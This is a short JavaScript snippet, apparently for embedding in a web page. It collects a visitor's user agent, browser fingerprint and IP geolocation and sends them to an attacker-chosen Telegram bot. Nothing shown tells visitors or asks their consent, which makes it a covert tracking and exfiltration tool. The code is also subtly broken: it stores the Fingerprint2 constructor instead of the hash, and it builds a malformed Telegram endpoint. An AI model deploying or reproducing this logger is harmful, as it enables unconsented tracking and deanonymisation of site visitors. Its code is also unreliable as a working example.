
var userData = {
    "IP": [],
    "fingerprintHash": '',
    "userAgent": navigator.userAgent            //JSAON DATA
}


new Fingerprint2().get(function(fingerprint, components){
  userData.fingerprintHash = Fingerprint2       //GETTING FINGER PRINT
});


var sendIpsTelegram = function(token, chatID){                                      // TO SEND INFO BY A TELEGRAM BOT
    endpoint='https://api.telegram.org/'+token+'/sendMessage';
    $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {         //GETTING IP INFO BY GEOIPLOOKUP
      userData.IP=dataIP;
    });
    setTimeout(function(){
        var xhr = new XMLHttpRequest();
        xhr.open("POST", endpoint, true);
        xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
        data={'chat_id': chatID, 'text': userData}                                  //DATA
        xhr.send(JSON.stringify(data));
        xhr.onloadend = function () {
        // done
        } 
    }, 3000)
}
